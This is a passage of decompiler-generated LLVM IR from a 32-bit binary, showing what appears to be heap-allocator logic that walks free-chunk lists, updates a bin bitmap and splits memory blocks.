  %v0_8052cbe = call i32 @function_8052bae()
  store i32 %v0_8052cbe, i32* %eax.global-to-local, align 4
  %v3_8052cc3 = and i8 %v0_8052c30, 2
  %v4_8052cc3 = icmp eq i8 %v3_8052cc3, 0
  %v6_8052cc3 = zext i8 %v3_8052cc3 to i32
  %v9_8052cc3 = and i32 %v1_8052c30, -256
  %v10_8052cc3 = or i32 %v9_8052cc3, %v6_8052cc3
  store i32 %v10_8052cc3, i32* @ebx, align 4
  br i1 %v4_8052cc3, label %dec_label_pc_8052db6.preheader, label %dec_label_pc_8052cd0

dec_label_pc_8052cd0:                             ; preds = %dec_label_pc_8052cba
  store i32 ptrtoint (i8* @global_var_8056c20.206 to i32), i32* %stack_var_-92, align 4
  %v2_8052cd8 = call i32 @function_80537f1(i32* bitcast (i8* @global_var_8056c20.206 to i32*))
  store i32 %v2_8052cd8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052db6.preheader

dec_label_pc_8052db6.preheader:                   ; preds = %dec_label_pc_8052cd0, %dec_label_pc_8052c83, %dec_label_pc_8052cba
  %stack_var_-40.0.ph = phi i32 [ %v2_8052c87, %dec_label_pc_8052c83 ], [ %v0_8052cbe, %dec_label_pc_8052cd0 ], [ %v0_8052cbe, %dec_label_pc_8052cba ]
  %v0_8052db69 = load i32, i32* @global_var_8056c60.210, align 32
  store i32 %v0_8052db69, i32* @ebp, align 4
  %v9_8052dbc15 = icmp eq i32 %v0_8052db69, 134573140
  %v1_8052dc217 = icmp eq i1 %v9_8052dbc15, false
  br i1 %v1_8052dc217, label %dec_label_pc_8052ce5.lr.ph, label %dec_label_pc_8052dc8

dec_label_pc_8052ce5.lr.ph:                       ; preds = %dec_label_pc_8052db6.preheader
  %v1_8052d0c = add i32 %v1_8052fc8, 16
  br label %dec_label_pc_8052ce5

dec_label_pc_8052ce5:                             ; preds = %dec_label_pc_8052ce5.lr.ph, %dec_label_pc_8052db6
  %v1_80532df = phi i32 [ %v0_8052db69, %dec_label_pc_8052ce5.lr.ph ], [ %v0_8052db6, %dec_label_pc_8052db6 ]
  %v1_8052ce5 = add i32 %v1_80532df, 4
  %v2_8052ce5 = inttoptr i32 %v1_8052ce5 to i32*
  %v3_8052ce5 = load i32, i32* %v2_8052ce5, align 4
  %v1_8052ce8 = add i32 %v1_80532df, 12
  %v2_8052ce8 = inttoptr i32 %v1_8052ce8 to i32*
  %v3_8052ce8 = load i32, i32* %v2_8052ce8, align 4
  store i32 %v3_8052ce8, i32* @edx, align 4
  %v1_8052ceb = and i32 %v3_8052ce5, -4
  store i32 %v1_8052ceb, i32* @edi, align 4
  br i1 %v6_8052c81, label %dec_label_pc_8052d17, label %dec_label_pc_8052cf8

dec_label_pc_8052cf8:                             ; preds = %dec_label_pc_8052ce5
  %v9_8052cf8 = icmp eq i32 %v3_8052ce8, 134573140
  %v1_8052cfe = icmp eq i1 %v9_8052cf8, false
  br i1 %v1_8052cfe, label %dec_label_pc_8052d17, label %dec_label_pc_8052d00

dec_label_pc_8052d00:                             ; preds = %dec_label_pc_8052cf8
  %v1_8052d00 = load i32, i32* @global_var_8056c50.208, align 16
  %v12_8052d00 = icmp eq i32 %v1_80532df, %v1_8052d00
  %v1_8052d06 = icmp eq i1 %v12_8052d00, false
  br i1 %v1_8052d06, label %dec_label_pc_8052d17, label %dec_label_pc_8052d08

dec_label_pc_8052d08:                             ; preds = %dec_label_pc_8052d00
  store i32 %v1_8052d0c, i32* %eax.global-to-local, align 4
  %v6_8052d11 = icmp ugt i32 %v1_8052ceb, %v1_8052d0c
  br i1 %v6_8052d11, label %dec_label_pc_80532c8, label %dec_label_pc_8052d17

dec_label_pc_8052d17:                             ; preds = %dec_label_pc_8052d08, %dec_label_pc_8052d00, %dec_label_pc_8052cf8, %dec_label_pc_8052ce5
  store i32 ptrtoint (i32* @global_var_8056c54.209 to i32), i32* %eax.global-to-local, align 4
  %v2_8052d1c = add i32 %v3_8052ce8, 8
  %v3_8052d1c = inttoptr i32 %v2_8052d1c to i32*
  store i32 ptrtoint (i32* @global_var_8056c54.209 to i32), i32* %v3_8052d1c, align 4
  %v0_8052d1f = load i32, i32* @edx, align 4
  store i32 %v0_8052d1f, i32* @global_var_8056c60.210, align 4
  %v0_8052d22 = load i32, i32* @edi, align 4
  %v15_8052d22 = icmp eq i32 %v0_8052d22, %v1_8052fc8
  br i1 %v15_8052d22, label %dec_label_pc_8053309, label %dec_label_pc_8052d2c

dec_label_pc_8052d2c:                             ; preds = %dec_label_pc_8052d17
  %v6_8052d32 = icmp ugt i32 %v0_8052d22, 255
  br i1 %v6_8052d32, label %dec_label_pc_8052d45, label %dec_label_pc_8052d34

dec_label_pc_8052d34:                             ; preds = %dec_label_pc_8052d2c
  %v2_8052d36 = udiv i32 %v0_8052d22, 8
  store i32 %v2_8052d36, i32* %esi.global-to-local, align 4
  %v1_8052d39 = mul nuw i32 %v2_8052d36, 8
  %v2_8052d39 = add i32 %v1_8052d39, 134573132
  store i32 %v2_8052d39, i32* @ebx, align 4
  %v1_8052d40 = add i32 %v1_8052d39, 134573140
  %v2_8052d40 = inttoptr i32 %v1_8052d40 to i32*
  %v3_8052d40 = load i32, i32* %v2_8052d40, align 4
  store i32 %v3_8052d40, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d8e

dec_label_pc_8052d45:                             ; preds = %dec_label_pc_8052d2c
  store i32 %v0_8052d22, i32* @eax, align 4
  %v0_8052d47 = call i32 @function_8052bae()
  store i32 %v0_8052d47, i32* %esi.global-to-local, align 4
  %v1_8052d4e = mul i32 %v0_8052d47, 8
  %v2_8052d4e = add i32 %v1_8052d4e, ptrtoint (i32* @global_var_8056c4c.207 to i32)
  store i32 %v2_8052d4e, i32* %eax.global-to-local, align 4
  %v1_8052d55 = add i32 %v1_8052d4e, add (i32 ptrtoint (i32* @global_var_8056c4c.207 to i32), i32 8)
  %v2_8052d55 = inttoptr i32 %v1_8052d55 to i32*
  %v3_8052d55 = load i32, i32* %v2_8052d55, align 4
  store i32 %v3_8052d55, i32* %edx.global-to-local, align 4
  store i32 %v3_8052d55, i32* @ebx, align 4
  %v12_8052d5e = icmp eq i32 %v3_8052d55, %v2_8052d4e
  br i1 %v12_8052d5e, label %dec_label_pc_8052d8e, label %dec_label_pc_8052d62

dec_label_pc_8052d62:                             ; preds = %dec_label_pc_8052d45
  %v1_8052d62 = add i32 %v1_8052d4e, add (i32 ptrtoint (i32* @global_var_8056c4c.207 to i32), i32 12)
  %v2_8052d62 = inttoptr i32 %v1_8052d62 to i32*
  %v3_8052d62 = load i32, i32* %v2_8052d62, align 4
  store i32 %v3_8052d62, i32* @ebx, align 4
  %v0_8052d65 = load i32, i32* @edi, align 4
  %v2_8052d65 = add i32 %v3_8052d62, 4
  %v3_8052d65 = inttoptr i32 %v2_8052d65 to i32*
  %v4_8052d65 = load i32, i32* %v3_8052d65, align 4
  %v10_8052d65 = icmp ult i32 %v0_8052d65, %v4_8052d65
  %v1_8052d68 = icmp eq i1 %v10_8052d65, false
  br i1 %v1_8052d68, label %dec_label_pc_8052d70, label %dec_label_pc_8052d8e

dec_label_pc_8052d70:                             ; preds = %dec_label_pc_8052d62
  %v1_8052d72 = or i32 %v0_8052d65, 1
  store i32 %v1_8052d72, i32* %eax.global-to-local, align 4
  store i32 %v3_8052d55, i32* %ebx.global-to-local, align 4
  %v2_8052d86105 = add i32 %v3_8052d55, 4
  %v3_8052d86106 = inttoptr i32 %v2_8052d86105 to i32*
  %v4_8052d86107 = load i32, i32* %v3_8052d86106, align 4
  %v10_8052d86108 = icmp ult i32 %v1_8052d72, %v4_8052d86107
  br i1 %v10_8052d86108, label %dec_label_pc_8052d77, label %dec_label_pc_8052d8b

dec_label_pc_8052d77:                             ; preds = %dec_label_pc_8052d70, %dec_label_pc_8052d77
  %v0_8052d8b109 = phi i32 [ %v3_8052d7b, %dec_label_pc_8052d77 ], [ %v3_8052d55, %dec_label_pc_8052d70 ]
  store i32 %v0_8052d8b109, i32* %ecx.global-to-local, align 4
  %v1_8052d7b = add i32 %v0_8052d8b109, 8
  %v2_8052d7b = inttoptr i32 %v1_8052d7b to i32*
  %v3_8052d7b = load i32, i32* %v2_8052d7b, align 4
  store i32 %v3_8052d7b, i32* %ecx.global-to-local, align 4
  store i32 %v3_8052d7b, i32* %ebx.global-to-local, align 4
  %v2_8052d86 = add i32 %v3_8052d7b, 4
  %v3_8052d86 = inttoptr i32 %v2_8052d86 to i32*
  %v4_8052d86 = load i32, i32* %v3_8052d86, align 4
  %v10_8052d86 = icmp ult i32 %v1_8052d72, %v4_8052d86
  br i1 %v10_8052d86, label %dec_label_pc_8052d77, label %dec_label_pc_8052d8b

dec_label_pc_8052d8b:                             ; preds = %dec_label_pc_8052d77, %dec_label_pc_8052d70
  %v0_8052d8b.lcssa = phi i32 [ %v3_8052d55, %dec_label_pc_8052d70 ], [ %v3_8052d7b, %dec_label_pc_8052d77 ]
  %v1_8052d8b = add i32 %v0_8052d8b.lcssa, 12
  %v2_8052d8b = inttoptr i32 %v1_8052d8b to i32*
  %v3_8052d8b = load i32, i32* %v2_8052d8b, align 4
  store i32 %v3_8052d8b, i32* @ebx, align 4
  br label %dec_label_pc_8052d8e

dec_label_pc_8052d8e:                             ; preds = %dec_label_pc_8052d34, %dec_label_pc_8052d62, %dec_label_pc_8052d45, %dec_label_pc_8052d8b
  %v0_8052d8e = phi i32 [ %v0_8052d47, %dec_label_pc_8052d45 ], [ %v0_8052d47, %dec_label_pc_8052d8b ], [ %v0_8052d47, %dec_label_pc_8052d62 ], [ %v2_8052d36, %dec_label_pc_8052d34 ]
  %stack_var_-64.1 = phi i32 [ %v2_8052d4e, %dec_label_pc_8052d45 ], [ %v0_8052d8b.lcssa, %dec_label_pc_8052d8b ], [ %v2_8052d4e, %dec_label_pc_8052d62 ], [ %v3_8052d40, %dec_label_pc_8052d34 ]
  %v1_8052d90 = urem i32 %v0_8052d8e, 32
  %v2_8052d90 = icmp eq i32 %v1_8052d90, 0
  store i32 %v1_8052d90, i32* %esi.global-to-local, align 4
  store i32 %v1_8052d90, i32* %ecx.global-to-local, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8052d9a = sdiv i32 %v0_8052d8e, 32
  store i32 %v2_8052d9a, i32* %edx.global-to-local, align 4
  br i1 %v2_8052d90, label %dec_label_pc_8052db6, label %bb

bb:                                               ; preds = %dec_label_pc_8052d8e
  %v5_8052d9d = shl i32 1, %v1_8052d90
  store i32 %v5_8052d9d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052db6

dec_label_pc_8052db6:                             ; preds = %dec_label_pc_8052d8e, %bb
  %v5_8052d9f = phi i32 [ 1, %dec_label_pc_8052d8e ], [ %v5_8052d9d, %bb ]
  %v1_8052d9f = mul nsw i32 %v2_8052d9a, 4
  %v2_8052d9f = add i32 %v1_8052d9f, ptrtoint (i32* @global_var_8056f54.211 to i32)
  %v3_8052d9f = inttoptr i32 %v2_8052d9f to i32*
  %v4_8052d9f = load i32, i32* %v3_8052d9f, align 4
  %v6_8052d9f = or i32 %v4_8052d9f, %v5_8052d9f
  store i32 %v6_8052d9f, i32* %v3_8052d9f, align 4
  %v0_8052da6 = load i32, i32* @ebx, align 4
  %v1_8052da6 = load i32, i32* @ebp, align 4
  %v2_8052da6 = add i32 %v1_8052da6, 12
  %v3_8052da6 = inttoptr i32 %v2_8052da6 to i32*
  store i32 %v0_8052da6, i32* %v3_8052da6, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_8052dad = load i32, i32* @ebp, align 4
  %v2_8052dad = add i32 %v1_8052dad, 8
  %v3_8052dad = inttoptr i32 %v2_8052dad to i32*
  store i32 %stack_var_-64.1, i32* %v3_8052dad, align 4
  %v0_8052db0 = load i32, i32* @ebp, align 4
  %v1_8052db0 = load i32, i32* @ebx, align 4
  %v2_8052db0 = add i32 %v1_8052db0, 8
  %v3_8052db0 = inttoptr i32 %v2_8052db0 to i32*
  store i32 %v0_8052db0, i32* %v3_8052db0, align 4
  %v0_8052db3 = load i32, i32* @ebp, align 4
  %v1_8052db3 = load i32, i32* @esi, align 4
  %v2_8052db3 = add i32 %v1_8052db3, 12
  %v3_8052db3 = inttoptr i32 %v2_8052db3 to i32*
  store i32 %v0_8052db3, i32* %v3_8052db3, align 4
  %v0_8052db6 = load i32, i32* @global_var_8056c60.210, align 32
  store i32 %v0_8052db6, i32* @ebp, align 4
  %v9_8052dbc = icmp eq i32 %v0_8052db6, 134573140
  %v1_8052dc2 = icmp eq i1 %v9_8052dbc, false
  br i1 %v1_8052dc2, label %dec_label_pc_8052ce5, label %dec_label_pc_8052dc8

dec_label_pc_8052dc8:                             ; preds = %dec_label_pc_8052db6, %dec_label_pc_8052db6.preheader
  br i1 %v8_8052c79, label %dec_label_pc_8052e56, label %dec_label_pc_8052dd6

dec_label_pc_8052dd6:                             ; preds = %dec_label_pc_8052dc8
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_8052dda = mul i32 %stack_var_-40.0.ph, 8
  %v2_8052dda = add i32 %v1_8052dda, ptrtoint (i32* @global_var_8056c4c.207 to i32)
  store i32 %v2_8052dda, i32* %edx.global-to-local, align 4
  %v1_8052de1 = add i32 %v1_8052dda, add (i32 ptrtoint (i32* @global_var_8056c4c.207 to i32), i32 12)
  %v2_8052de1 = inttoptr i32 %v1_8052de1 to i32*
  %storemerge1.pre = load i32, i32* %v2_8052de1, align 4
  br label %dec_label_pc_8052e52

dec_label_pc_8052de6:                             ; preds = %dec_label_pc_8052e52
  %v1_8052de6 = add i32 %v4_8052dfd, 4
  %v2_8052de6 = inttoptr i32 %v1_8052de6 to i32*
  %v3_8052de6 = load i32, i32* %v2_8052de6, align 4
  store i32 %v3_8052de6, i32* %ebx.global-to-local, align 4
  %v1_8052de9 = add i32 %v4_8052dfd, 12
  %v2_8052de9 = inttoptr i32 %v1_8052de9 to i32*
  %v3_8052de9 = load i32, i32* %v2_8052de9, align 4
  store i32 %v3_8052de9, i32* @ecx, align 4
  %v1_8052dec = and i32 %v3_8052de6, -4
  store i32 %v1_8052dec, i32* @ebx, align 4
  %v10_8052def = icmp ult i32 %v1_8052dec, %v1_8052fc8
  br i1 %v10_8052def, label %dec_label_pc_8052e52, label %dec_label_pc_8052df5

dec_label_pc_8052df5:                             ; preds = %dec_label_pc_8052de6
  %v1_8052df5 = add i32 %v4_8052dfd, 8
  %v2_8052df5 = inttoptr i32 %v1_8052df5 to i32*
  %v3_8052df5 = load i32, i32* %v2_8052df5, align 4
  store i32 %v3_8052df5, i32* @edx, align 4
  %v1_8052df8 = add i32 %v3_8052df5, 12
  %v2_8052df8 = inttoptr i32 %v1_8052df8 to i32*
  %v3_8052df8 = load i32, i32* %v2_8052df8, align 4
  %v15_8052df8 = icmp eq i32 %v3_8052df8, %v4_8052dfd
  %v1_8052dfb = icmp eq i1 %v15_8052df8, false
  br i1 %v1_8052dfb, label %dec_label_pc_8052e02, label %dec_label_pc_8052dfd

dec_label_pc_8052dfd:                             ; preds = %dec_label_pc_8052df5
  %v1_8052dfd = add i32 %v3_8052de9, 8
  %v2_8052dfd = inttoptr i32 %v1_8052dfd to i32*
  %v3_8052dfd = load i32, i32* %v2_8052dfd, align 4
  %v15_8052dfd = icmp eq i32 %v3_8052dfd, %v4_8052dfd
  br i1 %v15_8052dfd, label %dec_label_pc_8052e07, label %dec_label_pc_8052e02

dec_label_pc_8052e02:                             ; preds = %dec_label_pc_8052dfd, %dec_label_pc_8052df5
  %v0_8052e02 = call i32 @function_8053b35()
  store i32 %v0_8052e02, i32* %eax.global-to-local, align 4
  %v0_8052e07.pre = load i32, i32* @ebx, align 4
  %v0_8052e0d.pre = load i32, i32* @ecx, align 4
  %v1_8052e0d.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052e07

dec_label_pc_8052e07:                             ; preds = %dec_label_pc_8052dfd, %dec_label_pc_8052e02
  %v1_8052e0d = phi i32 [ %v3_8052df5, %dec_label_pc_8052dfd ], [ %v1_8052e0d.pre, %dec_label_pc_8052e02 ]
  %v0_8052e0d = phi i32 [ %v3_8052de9, %dec_label_pc_8052dfd ], [ %v0_8052e0d.pre, %dec_label_pc_8052e02 ]
  %v0_8052e07 = phi i32 [ %v1_8052dec, %dec_label_pc_8052dfd ], [ %v0_8052e07.pre, %dec_label_pc_8052e02 ]
  %v5_8052e09 = sub i32 %v0_8052e07, %v1_8052fc8
  store i32 %v5_8052e09, i32* %esi.global-to-local, align 4
  %v2_8052e0d = add i32 %v1_8052e0d, 12
  %v3_8052e0d = inttoptr i32 %v2_8052e0d to i32*
  store i32 %v0_8052e0d, i32* %v3_8052e0d, align 4
  %v0_8052e10 = load i32, i32* @edx, align 4
  %v1_8052e10 = load i32, i32* @ecx, align 4
  %v2_8052e10 = add i32 %v1_8052e10, 8
  %v3_8052e10 = inttoptr i32 %v2_8052e10 to i32*
  store i32 %v0_8052e10, i32* %v3_8052e10, align 4
  %v0_8052e13 = load i32, i32* %esi.global-to-local, align 4
  %v0_8052e16 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052e16 = add i32 %v0_8052e16, 8
  store i32 %v1_8052e16, i32* %ecx.global-to-local, align 4
  %tmp126 = icmp ult i32 %v0_8052e13, 16
  br i1 %tmp126, label %dec_label_pc_8053317, label %dec_label_pc_8052e1f

dec_label_pc_8052e1f:                             ; preds = %dec_label_pc_8052e07
  %v2_8052e23 = add i32 %v0_8052e16, %v1_8052fc8
  store i32 %v2_8052e23, i32* @edx, align 4
  %v1_8052e26 = or i32 %v1_8052fc8, 1
  store i32 %v1_8052e26, i32* %ebx.global-to-local, align 4
  %v2_8052e29 = add i32 %v0_8052e16, 4
  %v3_8052e29 = inttoptr i32 %v2_8052e29 to i32*
  store i32 %v1_8052e26, i32* %v3_8052e29, align 4
  %v0_8052e2c = load i32, i32* %esi.global-to-local, align 4
  %v1_8052e2e = or i32 %v0_8052e2c, 1
  store i32 %v1_8052e2e, i32* %eax.global-to-local, align 4
  %v0_8052e31 = load i32, i32* @edx, align 4
  %v1_8052e31 = load i32, i32* @ebp, align 4
  %v2_8052e31 = add i32 %v1_8052e31, 8
  %v3_8052e31 = inttoptr i32 %v2_8052e31 to i32*
  store i32 %v0_8052e31, i32* %v3_8052e31, align 4
  %v0_8052e34 = load i32, i32* @edx, align 4
  %v1_8052e34 = load i32, i32* @ebp, align 4
  %v2_8052e34 = add i32 %v1_8052e34, 12
  %v3_8052e34 = inttoptr i32 %v2_8052e34 to i32*
  store i32 %v0_8052e34, i32* %v3_8052e34, align 4
  %v0_8052e37 = load i32, i32* @edx, align 4
  %v1_8052e37 = add i32 %v0_8052e37, 8
  %v2_8052e37 = inttoptr i32 %v1_8052e37 to i32*
  store i32 ptrtoint (i32* @global_var_8056c54.209 to i32), i32* %v2_8052e37, align 4
  %v0_8052e3e = load i32, i32* @edx, align 4
  %v1_8052e3e = add i32 %v0_8052e3e, 12
  %v2_8052e3e = inttoptr i32 %v1_8052e3e to i32*
  store i32 ptrtoint (i32* @global_var_8056c54.209 to i32), i32* %v2_8052e3e, align 4
  %v0_8052e45 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052e45 = load i32, i32* @edx, align 4
  %v2_8052e45 = add i32 %v1_8052e45, 4
  %v3_8052e45 = inttoptr i32 %v2_8052e45 to i32*
  store i32 %v0_8052e45, i32* %v3_8052e45, align 4
  %v0_8052e48 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052e48 = load i32, i32* @edx, align 4
  %v3_8052e48 = add i32 %v1_8052e48, %v0_8052e48
  %v4_8052e48 = inttoptr i32 %v3_8052e48 to i32*
  store i32 %v0_8052e48, i32* %v4_8052e48, align 4
  br label %dec_label_pc_805331c

dec_label_pc_8052e52:                             ; preds = %dec_label_pc_8052de6, %dec_label_pc_8052dd6
  %v4_8052dfd = phi i32 [ %storemerge1.pre, %dec_label_pc_8052dd6 ], [ %v3_8052de9, %dec_label_pc_8052de6 ]
  store i32 %v4_8052dfd, i32* %eax.global-to-local, align 4
  %v12_8052e52 = icmp eq i32 %v4_8052dfd, %v2_8052dda
  %v1_8052e54 = icmp eq i1 %v12_8052e52, false
  br i1 %v1_8052e54, label %dec_label_pc_8052de6, label %dec_label_pc_8052e56.loopexit

dec_label_pc_8052e56.loopexit:                    ; preds = %dec_label_pc_8052e52
  br label %dec_label_pc_8052e56

dec_label_pc_8052e56:                             ; preds = %dec_label_pc_8052e56.loopexit, %dec_label_pc_8052dc8
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_8052e5f = add i32 %stack_var_-40.0.ph, 1
  %v2_8052e62 = udiv i32 %v1_8052e5f, 32
  store i32 %v2_8052e62, i32* @edi, align 4
  %v1_8052e65 = mul i32 %v1_8052e5f, 8
  %v2_8052e65 = add i32 %v1_8052e65, ptrtoint (i32* @global_var_8056c4c.207 to i32)
  store i32 %v2_8052e65, i32* %ebx.global-to-local, align 4
  %v1_8052e6c = urem i32 %v1_8052e5f, 32
  %v2_8052e6c = icmp eq i32 %v1_8052e6c, 0
  store i32 %v1_8052e6c, i32* %ecx.global-to-local, align 4
  %v1_8052e6f = mul nuw nsw i32 %v2_8052e62, 4
  %v2_8052e6f = add i32 %v1_8052e6f, ptrtoint (i32* @global_var_8056f54.211 to i32)
  %v3_8052e6f = inttoptr i32 %v2_8052e6f to i32*
  %v4_8052e6f = load i32, i32* %v3_8052e6f, align 4
  store i32 %v4_8052e6f, i32* %edx.global-to-local, align 4
  br i1 %v2_8052e6c, label %.preheader, label %bb88

bb88:                                             ; preds = %dec_label_pc_8052e56
  %v5_8052e76 = shl i32 1, %v1_8052e6c
  store i32 %v5_8052e76, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_8052e56, %bb88, %dec_label_pc_8052eb7
  %v1_8052e78 = phi i32 [ %v1_8052e78.pre, %dec_label_pc_8052eb7 ], [ %v4_8052e6f, %bb88 ], [ %v4_8052e6f, %dec_label_pc_8052e56 ]
  %v0_8052e7c = phi i32 [ %v0_8052e78.pre, %dec_label_pc_8052eb7 ], [ %v5_8052e76, %bb88 ], [ 1, %dec_label_pc_8052e56 ]
  %tmp89 = icmp ule i32 %v0_8052e7c, %v1_8052e78
  %v1_8052e7c = icmp eq i32 %v0_8052e7c, 0
  %v1_8052e7e = icmp eq i1 %v1_8052e7c, false
  %or.cond = and i1 %tmp89, %v1_8052e7e
  br i1 %or.cond, label %dec_label_pc_8052e7c.dec_label_pc_8052eac.preheader_crit_edge, label %dec_label_pc_8052e80.preheader

dec_label_pc_8052e7c.dec_label_pc_8052eac.preheader_crit_edge: ; preds = %.preheader
  %v0_8052ea77.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052eac.preheader

dec_label_pc_8052e80.preheader:                   ; preds = %.preheader
  %v0_8052e80.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8052e80

dec_label_pc_8052e80:                             ; preds = %dec_label_pc_8052e80.preheader, %dec_label_pc_8052e8a
  %v0_8052e80 = phi i32 [ %v0_8052e80.pre, %dec_label_pc_8052e80.preheader ], [ %v1_8052e80, %dec_label_pc_8052e8a ]
  %v1_8052e80 = add i32 %v0_8052e80, 1
  store i32 %v1_8052e80, i32* @edi, align 4
  %v6_8052e84 = icmp ugt i32 %v1_8052e80, 2
  br i1 %v6_8052e84, label %dec_label_pc_8052f33.loopexit, label %dec_label_pc_8052e8a

dec_label_pc_8052e8a:                             ; preds = %dec_label_pc_8052e80
  %v1_8052e8a = mul i32 %v1_8052e80, 4
  %v2_8052e8a = add i32 %v1_8052e8a, ptrtoint (i32* @global_var_8056f54.211 to i32)
  %v3_8052e8a = inttoptr i32 %v2_8052e8a to i32*
  %v4_8052e8a = load i32, i32* %v3_8052e8a, align 4
  store i32 %v4_8052e8a, i32* %edx.global-to-local, align 4
  %v1_8052e91 = icmp eq i32 %v4_8052e8a, 0
  br i1 %v1_8052e91, label %dec_label_pc_8052e80, label %dec_label_pc_8052e95

dec_label_pc_8052e95:                             ; preds = %dec_label_pc_8052e8a
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_8052e9c = mul i32 %v1_8052e80, 256
  store i32 %v2_8052e9c, i32* %eax.global-to-local, align 4
  %v1_8052e9f = add i32 %v2_8052e9c, ptrtoint (i32* @global_var_8056c4c.207 to i32)
  store i32 %v1_8052e9f, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052eac.preheader

dec_label_pc_8052eac.preheader:                   ; preds = %dec_label_pc_8052e7c.dec_label_pc_8052eac.preheader_crit_edge, %dec_label_pc_8052e95
  %v0_8052ea77 = phi i32 [ %v1_8052e9f, %dec_label_pc_8052e95 ], [ %v0_8052ea77.pre, %dec_label_pc_8052e7c.dec_label_pc_8052eac.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_8052e95 ], [ %v0_8052e7c, %dec_label_pc_8052e7c.dec_label_pc_8052eac.preheader_crit_edge ]
  %v0_8052ebe = phi i32 [ %v4_8052e8a, %dec_label_pc_8052e95 ], [ %v1_8052e78, %dec_label_pc_8052e7c.dec_label_pc_8052eac.preheader_crit_edge ]
  %v2_8052eac4 = and i32 %v0_8052ebe, %esi.promoted
  %v3_8052eac5 = icmp eq i32 %v2_8052eac4, 0
  br i1 %v3_8052eac5, label %dec_label_pc_8052ea7, label %dec_label_pc_8052eb0

dec_label_pc_8052ea7:                             ; preds = %dec_label_pc_8052eac.preheader, %dec_label_pc_8052ea7
  %v2_8052eaa18 = phi i32 [ %v2_8052eaa, %dec_label_pc_8052ea7 ], [ %esi.promoted, %dec_label_pc_8052eac.preheader ]
  %v0_8052ea78 = phi i32 [ %v1_8052ea7, %dec_label_pc_8052ea7 ], [ %v0_8052ea77, %dec_label_pc_8052eac.preheader ]
  %v1_8052ea7 = add i32 %v0_8052ea78, 8
  %v2_8052eaa = mul i32 %v2_8052eaa18, 2
  %v2_8052eac = and i32 %v2_8052eaa, %v0_8052ebe
  %v3_8052eac = icmp eq i32 %v2_8052eac, 0
  br i1 %v3_8052eac, label %dec_label_pc_8052ea7, label %dec_label_pc_8052eac.dec_label_pc_8052eb0_crit_edge

dec_label_pc_8052eac.dec_label_pc_8052eb0_crit_edge: ; preds = %dec_label_pc_8052ea7
  store i32 %v1_8052ea7, i32* %ebx.global-to-local, align 4
  store i32 %v2_8052eaa, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052eb0

dec_label_pc_8052eb0:                             ; preds = %dec_label_pc_8052eac.dec_label_pc_8052eb0_crit_edge, %dec_label_pc_8052eac.preheader
  %v0_8052ec0 = phi i32 [ %v2_8052eaa, %dec_label_pc_8052eac.dec_label_pc_8052eb0_crit_edge ], [ %esi.promoted, %dec_label_pc_8052eac.preheader ]
  %v1_8052eda = phi i32 [ %v1_8052ea7, %dec_label_pc_8052eac.dec_label_pc_8052eb0_crit_edge ], [ %v0_8052ea77, %dec_label_pc_8052eac.preheader ]
  %v1_8052eb0 = add i32 %v1_8052eda, 12
  %v2_8052eb0 = inttoptr i32 %v1_8052eb0 to i32*
  %v3_8052eb0 = load i32, i32* %v2_8052eb0, align 4
  store i32 %v3_8052eb0, i32* %ecx.global-to-local, align 4
  %v12_8052eb3 = icmp eq i32 %v3_8052eb0, %v1_8052eda
  %v1_8052eb5 = icmp eq i1 %v12_8052eb3, false
  br i1 %v1_8052eb5, label %dec_label_pc_8052ecb, label %dec_label_pc_8052eb7

dec_label_pc_8052eb7:                             ; preds = %dec_label_pc_8052eb0
  %v1_8052eb9 = add i32 %v3_8052eb0, 8
  store i32 %v1_8052eb9, i32* %ebx.global-to-local, align 4
  %v1_8052ebc = sub i32 -1, %v0_8052ec0
  store i32 %v1_8052ebc, i32* %eax.global-to-local, align 4
  %v2_8052ebe = and i32 %v0_8052ebe, %v1_8052ebc
  store i32 %v2_8052ebe, i32* %edx.global-to-local, align 4
  %v2_8052ec0 = mul i32 %v0_8052ec0, 2
  store i32 %v2_8052ec0, i32* %esi.global-to-local, align 4
  %v1_8052ec2 = load i32, i32* @edi, align 4
  %v2_8052ec2 = mul i32 %v1_8052ec2, 4
  %v3_8052ec2 = add i32 %v2_8052ec2, ptrtoint (i32* @global_var_8056f54.211 to i32)
  %v4_8052ec2 = inttoptr i32 %v3_8052ec2 to i32*
  store i32 %v2_8052ebe, i32* %v4_8052ec2, align 4
  %v0_8052e78.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8052e78.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_8052ecb:                             ; preds = %dec_label_pc_8052eb0
  %v1_8052ecb = add i32 %v3_8052eb0, 4
  %v2_8052ecb = inttoptr i32 %v1_8052ecb to i32*
  %v3_8052ecb = load i32, i32* %v2_8052ecb, align 4
  store i32 %v3_8052ecb, i32* %edx.global-to-local, align 4
  %v1_8052ece = add i32 %v3_8052eb0, 12
  %v2_8052ece = inttoptr i32 %v1_8052ece to i32*
  %v3_8052ece = load i32, i32* %v2_8052ece, align 4
  store i32 %v3_8052ece, i32* %eax.global-to-local, align 4
  %v1_8052ed1 = and i32 %v3_8052ecb, -4
  store i32 %v1_8052ed1, i32* @edx, align 4
  %v5_8052ed6 = sub i32 %v1_8052ed1, %v1_8052fc8
  store i32 %v5_8052ed6, i32* %esi.global-to-local, align 4
  store i32 %v3_8052ece, i32* %v2_8052eb0, align 4
  %v0_8052edd = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052edd = load i32, i32* %eax.global-to-local, align 4
  %v2_8052edd = add i32 %v1_8052edd, 8
  %v3_8052edd = inttoptr i32 %v2_8052edd to i32*
